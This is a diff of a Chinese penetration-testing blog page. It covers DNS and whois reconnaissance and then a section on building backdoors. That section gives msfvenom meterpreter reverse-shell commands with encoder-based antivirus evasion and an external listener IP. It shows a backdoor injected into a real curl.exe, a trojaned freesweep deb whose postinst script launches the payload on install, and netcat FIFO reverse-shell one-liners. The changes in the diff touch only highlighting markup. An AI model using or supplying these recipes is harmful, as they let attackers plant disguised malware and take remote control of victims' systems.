time:</span> <span class="hljs-number">0</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-comment">#53(192.168.1.1) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Sat</span> <span class="hljs-string">May</span> <span class="hljs-number">14</span> <span class="hljs-number">03</span><span class="hljs-string">:52:57</span> <span class="hljs-string">UTC</span> <span class="hljs-number">2022</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">70</span><br><br><br></code></pre></td></tr></table></figure>
 
 
 
 <p>指定域名服务器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└─# dig @114.114.114.114 baidu.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; @114.114.114.114 baidu.com</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 38786</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;baidu.com.			IN	A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">baidu.com.		222	IN	A	220.181.38.251</span><br><span class="line">baidu.com.		222	IN	A	220.181.38.148</span><br><span class="line"></span><br><span class="line">;; Query time: 3 msec</span><br><span class="line">;; SERVER: 114.114.114.114#53(114.114.114.114) (UDP)</span><br><span class="line">;; WHEN: Sat May 14 03:53:57 UTC 2022</span><br><span class="line">;; MSG SIZE  rcvd: 70</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">└─#</span> <span class="hljs-string">dig</span> <span class="hljs-string">@114.114.114.114</span> <span class="hljs-string">baidu.com</span><br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.18</span><span class="hljs-number">.0</span><span class="hljs-number">-2</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">@114.114.114.114</span> <span class="hljs-string">baidu.com</span><br><span class="hljs-string">;</span> <span class="hljs-string">(1</span> <span class="hljs-string">server</span> <span class="hljs-string">found)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">NOERROR,</span> <span class="hljs-attr">id:</span> <span class="hljs-number">38786</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">4096</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;baidu.com.</span>			<span class="hljs-string">IN</span>	<span class="hljs-string">A</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">ANSWER SECTION:</span><br><span class="hljs-string">baidu.com.</span>		<span class="hljs-number">222</span>	<span class="hljs-string">IN</span>	<span class="hljs-string">A</span>	<span class="hljs-number">220.181</span><span class="hljs-number">.38</span><span class="hljs-number">.251</span><br><span class="hljs-string">baidu.com.</span>		<span class="hljs-number">222</span>	<span class="hljs-string">IN</span>	<span class="hljs-string">A</span>	<span class="hljs-number">220.181</span><span class="hljs-number">.38</span><span class="hljs-number">.148</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">3</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><span class="hljs-comment">#53(114.114.114.114) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Sat</span> <span class="hljs-string">May</span> <span class="hljs-number">14</span> <span class="hljs-number">03</span><span class="hljs-string">:53:57</span> <span class="hljs-string">UTC</span> <span class="hljs-number">2022</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">70</span><br><br><br></code></pre></td></tr></table></figure>
 
 
 
 <p>查询所有记录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @114.114.114.114 ustc.edu.cn any</span><br></pre></td></tr></table></figure>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dig</span> @<span class="hljs-number">114.114.114.114</span> ustc.edu.cn any<br></code></pre></td></tr></table></figure>
 
 <p>注：如果使用内网可能会查询失败，需要使用公网主机查询</p>
 <p>PTR反向解析查询</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">─# dig -x 114.114.114.114</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; -x 114.114.114.114</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58424</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;114.114.114.114.in-addr.arpa.	IN	PTR</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">114.114.114.114.in-addr.arpa. 300 IN	PTR	public1.114dns.com.</span><br><span class="line"></span><br><span class="line">;; Query time: 3 msec</span><br><span class="line">;; SERVER: 192.168.1.1#53(192.168.1.1) (UDP)</span><br><span class="line">;; WHEN: Sat May 14 04:00:23 UTC 2022</span><br><span class="line">;; MSG SIZE  rcvd: 89</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">─#</span> <span class="hljs-string">dig</span> <span class="hljs-string">-x</span> <span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.18</span><span class="hljs-number">.0</span><span class="hljs-number">-2</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">-x</span> <span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">NOERROR,</span> <span class="hljs-attr">id:</span> <span class="hljs-number">58424</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">4096</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;114.114.114.114.in-addr.arpa.</span>	<span class="hljs-string">IN</span>	<span class="hljs-string">PTR</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">ANSWER SECTION:</span><br><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><span class="hljs-string">.in-addr.arpa.</span> <span class="hljs-number">300</span> <span class="hljs-string">IN</span>	<span class="hljs-string">PTR</span>	<span class="hljs-string">public1.114dns.com.</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">3</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-comment">#53(192.168.1.1) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Sat</span> <span class="hljs-string">May</span> <span class="hljs-number">14</span> <span class="hljs-number">04</span><span class="hljs-string">:00:23</span> <span class="hljs-string">UTC</span> <span class="hljs-number">2022</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">89</span><br><br><br></code></pre></td></tr></table></figure>
 
 
 
-<h5 id="3-3-3查找DNS服务器的bind版本信息"><a href="#3-3-3查找DNS服务器的bind版本信息" class="headerlink" title="3.3.3查找DNS服务器的bind版本信息"></a>3.3.3查找DNS服务器的bind版本信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig text chaos VERSION.BIND @ns3.dnsv4.com</span><br></pre></td></tr></table></figure>
+<h5 id="3-3-3查找DNS服务器的bind版本信息"><a href="#3-3-3查找DNS服务器的bind版本信息" class="headerlink" title="3.3.3查找DNS服务器的bind版本信息"></a>3.3.3查找DNS服务器的bind版本信息</h5><figure class="highlight mel"><table><tr><td class="code"><pre><code class="hljs mel">dig <span class="hljs-keyword">text</span> chaos VERSION.BIND @ns3.dnsv4.com<br></code></pre></td></tr></table></figure>
 
 <p>@后面跟上要查询的dns服务器的域名</p>
 <p>查询的目的是通过服务器的版本信息，去网上查找dns的漏洞</p>
 <h5 id="3-3-4网站域名的域名注册信息和备案信息"><a href="#3-3-4网站域名的域名注册信息和备案信息" class="headerlink" title="3.3.4网站域名的域名注册信息和备案信息"></a>3.3.4网站域名的域名注册信息和备案信息</h5><p><strong>1）网站注册信息通过whois命令查询和web接口查询</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">whois ustc.edu.cn</span><br><span class="line"># whois zte.com.cn</span><br><span class="line">Domain Name: zte.com.cn</span><br><span class="line">ROID: 20021209s10011s00000536-cn</span><br><span class="line">Domain Status: ok</span><br><span class="line">Registrant: 中兴通讯股份有限公司</span><br><span class="line">Registrant Contact Email: shi.chaoran@zte.com.cn</span><br><span class="line">Sponsoring Registrar: 广东互易网络知识产权有限公司</span><br><span class="line">Name Server: cns1.zdnscloud.net</span><br><span class="line">Name Server: dns1.zdnscloud.info</span><br><span class="line">Name Server: ins1.zdnscloud.com</span><br><span class="line">Name Server: vns1.zdnscloud.biz</span><br><span class="line">Registration Time: 1998-12-28 00:00:00</span><br><span class="line">Expiration Time: 2023-12-28 00:00:00</span><br><span class="line">DNSSEC: unsigned</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">whois</span> <span class="hljs-string">ustc.edu.cn</span><br><span class="hljs-comment"># whois zte.com.cn</span><br><span class="hljs-attr">Domain Name:</span> <span class="hljs-string">zte.com.cn</span><br><span class="hljs-attr">ROID:</span> <span class="hljs-string">20021209s10011s00000536-cn</span><br><span class="hljs-attr">Domain Status:</span> <span class="hljs-string">ok</span><br><span class="hljs-attr">Registrant:</span> <span class="hljs-string">中兴通讯股份有限公司</span><br><span class="hljs-attr">Registrant Contact Email:</span> <span class="hljs-string">shi.chaoran@zte.com.cn</span><br><span class="hljs-attr">Sponsoring Registrar:</span> <span class="hljs-string">广东互易网络知识产权有限公司</span><br><span class="hljs-attr">Name Server:</span> <span class="hljs-string">cns1.zdnscloud.net</span><br><span class="hljs-attr">Name Server:</span> <span class="hljs-string">dns1.zdnscloud.info</span><br><span class="hljs-attr">Name Server:</span> <span class="hljs-string">ins1.zdnscloud.com</span><br><span class="hljs-attr">Name Server:</span> <span class="hljs-string">vns1.zdnscloud.biz</span><br><span class="hljs-attr">Registration Time:</span> <span class="hljs-number">1998-12-28 00:00:00</span><br><span class="hljs-attr">Expiration Time:</span> <span class="hljs-number">2023-12-28 00:00:00</span><br><span class="hljs-attr">DNSSEC:</span> <span class="hljs-string">unsigned</span><br><br></code></pre></td></tr></table></figure>
 
 <p><strong>web接口查询</strong></p>
 <p>注册信息举例两个</p>
@@ -242,21 +448,21 @@
 <p>5.1.3基于ssh协议收集信息</p>
 <p>扫描ssh版本 模块 ssh_version</p>
 <p>ssh登陆模块 ssh_login</p>
-<h2 id="Section-4-后门程序制作"><a href="#Section-4-后门程序制作" class="headerlink" title="Section 4 后门程序制作"></a>Section 4 后门程序制作</h2><h3 id="part-0-制作windows恶意软件来获取shell"><a href="#part-0-制作windows恶意软件来获取shell" class="headerlink" title="part 0 制作windows恶意软件来获取shell"></a>part 0 制作windows恶意软件来获取shell</h3><h4 id="branch-1使用一个编码器编码-（易被查杀）"><a href="#branch-1使用一个编码器编码-（易被查杀）" class="headerlink" title="branch 1使用一个编码器编码 （易被查杀）"></a>branch 1使用一个编码器编码 （易被查杀）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=175.178.254.75 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 10 -f exe -o /root/curl</span><br><span class="line">1.exe</span><br></pre></td></tr></table></figure>
+<h2 id="Section-4-后门程序制作"><a href="#Section-4-后门程序制作" class="headerlink" title="Section 4 后门程序制作"></a>Section 4 后门程序制作</h2><h3 id="part-0-制作windows恶意软件来获取shell"><a href="#part-0-制作windows恶意软件来获取shell" class="headerlink" title="part 0 制作windows恶意软件来获取shell"></a>part 0 制作windows恶意软件来获取shell</h3><h4 id="branch-1使用一个编码器编码-（易被查杀）"><a href="#branch-1使用一个编码器编码-（易被查杀）" class="headerlink" title="branch 1使用一个编码器编码 （易被查杀）"></a>branch 1使用一个编码器编码 （易被查杀）</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">a</span> x86 <span class="hljs-attr">--platform</span> windows -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">175.178</span>.<span class="hljs-number">254.75</span> LPORT=<span class="hljs-number">4444</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;\x00&quot;</span> -e x86/shikata_ga_nai -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10</span> -f exe -o /root/curl<br><span class="hljs-number">1</span>.exe<br></code></pre></td></tr></table></figure>
 
 <p><strong>branch 1.1使用两个编码器组合编码 （不一定比一个编码器更安全）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=175.178.254.75 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=175.178.254.75 LPORT=4444 -b &quot;\x00&quot; -e x86/alpha_upper -i 20 -f exe -o /root/curl2.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=175.178.254.75 <span class="hljs-attribute">LPORT</span>=4444 -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=175.178.254.75 <span class="hljs-attribute">LPORT</span>=4444 -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86/alpha_upper -i 20 -f exe -o /root/curl2.exe<br></code></pre></td></tr></table></figure>
 
 
 
-<h5 id="branch-2-模拟黑客给真正的curl-exe软件加上后门"><a href="#branch-2-模拟黑客给真正的curl-exe软件加上后门" class="headerlink" title="branch 2 模拟黑客给真正的curl.exe软件加上后门"></a>branch 2 模拟黑客给真正的curl.exe软件加上后门</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=175.178.254.75 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -x /root/curl.exe -i 10 -f exe -o /root/curl</span><br><span class="line">3.exe</span><br></pre></td></tr></table></figure>
+<h5 id="branch-2-模拟黑客给真正的curl-exe软件加上后门"><a href="#branch-2-模拟黑客给真正的curl-exe软件加上后门" class="headerlink" title="branch 2 模拟黑客给真正的curl.exe软件加上后门"></a>branch 2 模拟黑客给真正的curl.exe软件加上后门</h5><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">175.178</span>.<span class="hljs-number">254.75</span> LPORT=<span class="hljs-number">4444</span> -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -x /</span>root<span class="hljs-regexp">/curl.exe -i 10 -f exe -o /</span>root/curl<br><span class="hljs-number">3</span>.exe<br></code></pre></td></tr></table></figure>
 
 <p>-x :添加基础可执行的文件，此处需要自己准备</p>
 <h3 id="part-1-linux恶意软件-后门"><a href="#part-1-linux恶意软件-后门" class="headerlink" title="part 1 linux恶意软件 后门"></a>part 1 linux恶意软件 后门</h3><p>制作恶意deb软件包来触发后门</p>
 <h4 id="steps"><a href="#steps" class="headerlink" title="steps"></a>steps</h4><p><strong>step 1.apt –download-only install packagename</strong></p>
 <p><strong>step 2.dpkg -x &#x2F;var&#x2F;cahce&#x2F;apt&#x2F;freesweep &#x2F;root&#x2F;free 解压deb到&#x2F;root</strong></p>
 <p><strong>step 3.msf生成后门</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=175.178.254.75 LPORT=4444 -b &quot;\x00&quot; -i 10 -f elf -o /root/free/usr/games/freesweep_s</span><br><span class="line">ource</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">msfvenom -a x64 --platform linux -p linux<span class="hljs-regexp">/x64/m</span>eterpreter<span class="hljs-regexp">/reverse_tcp LHOST=175.178.254.75 LPORT=4444 -b &quot;\x00&quot; -i 10 -f elf -o /</span>root<span class="hljs-regexp">/free/u</span>sr<span class="hljs-regexp">/games/</span>freesweep_s<br>ource<br></code></pre></td></tr></table></figure>
 
 
 
@@ -273,14 +479,14 @@
 <p>-e :编码器 可以通过命令 –list encoders 列出可用的编码器</p>
 <p>拓展生成软件包时无论是payload和软件包都要选择能够在目标操作系统上执行的</p>
 <p><strong>step 4 创建软件包信息目录</strong></p>
-<p>tee &#x2F;root&#x2F;free&#x2F;DEBIAN&#x2F;control &lt;&lt;bye<br>Package:freesweep<br>Version:1.0.1-1<br>Section:Games and Amusement<br>Priority:optional<br>Architecture:amd64<br>Maintainer:Ubuntu MOTU Developers (<a href="mailto:&#x75;&#x62;&#117;&#110;&#x74;&#x75;&#x2d;&#109;&#x6f;&#116;&#x75;&#64;&#108;&#105;&#115;&#116;&#115;&#x2e;&#x75;&#98;&#x75;&#110;&#116;&#117;&#x2e;&#x63;&#x6f;&#x6d;">&#x75;&#x62;&#117;&#110;&#x74;&#x75;&#x2d;&#109;&#x6f;&#116;&#x75;&#64;&#108;&#105;&#115;&#116;&#115;&#x2e;&#x75;&#98;&#x75;&#110;&#116;&#117;&#x2e;&#x63;&#x6f;&#x6d;</a>)<br>Description:a text-based minesweeper<br>freesweep is an im plementation of the popular minesweeper games,where one tries to find all the <br>mines without igniting any,based on hints given by the computer.<br>bye</p>
+<p>tee &#x2F;root&#x2F;free&#x2F;DEBIAN&#x2F;control &lt;&lt;bye<br>Package:freesweep<br>Version:1.0.1-1<br>Section:Games and Amusement<br>Priority:optional<br>Architecture:amd64<br>Maintainer:Ubuntu MOTU Developers (<a href="mailto:&#117;&#98;&#117;&#110;&#116;&#x75;&#45;&#109;&#111;&#x74;&#x75;&#x40;&#108;&#x69;&#115;&#116;&#115;&#x2e;&#117;&#x62;&#x75;&#x6e;&#116;&#x75;&#46;&#x63;&#x6f;&#x6d;">&#117;&#98;&#117;&#110;&#116;&#x75;&#45;&#109;&#111;&#x74;&#x75;&#x40;&#108;&#x69;&#115;&#116;&#115;&#x2e;&#117;&#x62;&#x75;&#x6e;&#116;&#x75;&#46;&#x63;&#x6f;&#x6d;</a>)<br>Description:a text-based minesweeper<br>freesweep is an im plementation of the popular minesweeper games,where one tries to find all the <br>mines without igniting any,based on hints given by the computer.<br>bye</p>
 <p><strong>step 5创建deb软件包安装脚本文件，来加载后门</strong>**</p>
 <p>tee &#x2F;root&#x2F;free&#x2F;DEBIAN&#x2F;postinst &lt;&lt;bye<br>#!&#x2F;bin&#x2F;bash<br>sudo chmod 2755 usr&#x2F;games&#x2F;freesweep_sources<br>sudo usr&#x2F;games&#x2F;freesweep_souces &amp;<br>bye</p>
 <p>ps:创建完成文件需要给文件赋权 (必须 &gt;&#x3D;0555 且 &lt;&#x3D;0775)</p>
 <p><strong>step 6构建软件包deb</strong></p>
 <p>dpkg-deb –build &#x2F;root&#x2F;free&#x2F;</p>
 <h3 id="part2-制作linux软件来制作后门程序"><a href="#part2-制作linux软件来制作后门程序" class="headerlink" title="part2 制作linux软件来制作后门程序"></a>part2 制作linux软件来制作后门程序</h3><p>steps:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=175.178.254.75 LPORT=4444 -b &quot;\x00&quot; -i 10 -f elf -o /root/backdoor</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">a</span> x64 <span class="hljs-attr">--platform</span> linux -<span class="hljs-selector-tag">p</span> linux/x64/meterpreter/reverse_tcp LHOST=<span class="hljs-number">175.178</span>.<span class="hljs-number">254.75</span> LPORT=<span class="hljs-number">4444</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;\x00&quot;</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10</span> -f elf -o /root/backdoor<br></code></pre></td></tr></table></figure>
 
 <p>将后门上传linux靶机赋权chmod +x backdoor</p>
 <p>并执行 source backdoor</p>
@@ -314,9 +520,9 @@
 <p>4.由nc的特性，知道nc的stdin会通过nc传送到服务端nc</p>
 <p>整个过程总结一句话：nc服务端的指令通过nc 给&#x2F;bin&#x2F;bash执行后又通过nc回传nc服务端，实现反向shell的作用</p>
 <p>由nc的可执行的options，可将上述指令写作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/p ;mkfifo /tmp/p;cat /tmp/p | nc 192.168.1.200 6666 -e /bin/bash &gt;/tmp/p 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>p ;mkfifo <span class="hljs-regexp">/tmp/</span>p;cat <span class="hljs-regexp">/tmp/</span>p | nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.200</span> <span class="hljs-number">6666</span> -e <span class="hljs-regexp">/bin/</span>bash &gt;<span class="hljs-regexp">/tmp/</span>p <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
-<h6 id="b利用块文件制作反向shell"><a href="#b利用块文件制作反向shell" class="headerlink" title="b利用块文件制作反向shell"></a>b利用块文件制作反向shell</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backblock p ; nc 192.168.1.200 6666 &lt;backblock | /bin/bash &gt;backblock 2&gt;&amp;1 </span><br></pre></td></tr></table></figure>
+<h6 id="b利用块文件制作反向shell"><a href="#b利用块文件制作反向shell" class="headerlink" title="b利用块文件制作反向shell"></a>b利用块文件制作反向shell</h6><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mknod</span> backblock p ; nc <span class="hljs-number">192.168.1.200</span> <span class="hljs-number">6666</span> &lt;backblock | /bin/bash &gt;backblock <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure>
 
 <p>mknod :创建块设备，p是创建的设备类型（b      创建有缓冲的区块特殊文件；c, u   创建(没有缓冲的)字符特殊文件 ，p创建先进先出(FIFO)特殊文件）</p>
 <p>通过创建的fifo特殊文件backblock实现了nc指令执行和结果回传的循环，详细执行流程见管道反向shell的流程梳理</p>
@@ -326,7 +532,7 @@
 <p>nc -lvvp 6666</p>
 <h5 id="4-perl"><a href="#4-perl" class="headerlink" title="4)perl"></a>4)perl</h5><p>perl反弹shell的代码</p>
 <p>或者通过msfvenom的模块建立连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep &quot;perl&quot; | awk &quot;&#123;print \$1&#125;&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight coq"><table><tr><td class="code"><pre><code class="hljs coq">msfvenom -l payloads | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;perl&quot;</span> | <span class="hljs-type">awk</span> <span class="hljs-string">&quot;&#123;print \$1&#125;&quot;</span><br></code></pre></td></tr></table></figure>
 
 <h5 id="5-python"><a href="#5-python" class="headerlink" title="5)python"></a>5)python</h5><p>被控制端：</p>
 <p>python代码调用建立反向连接的shell（代码比较长，到时候自己百度）</p>
@@ -334,29 +540,29 @@
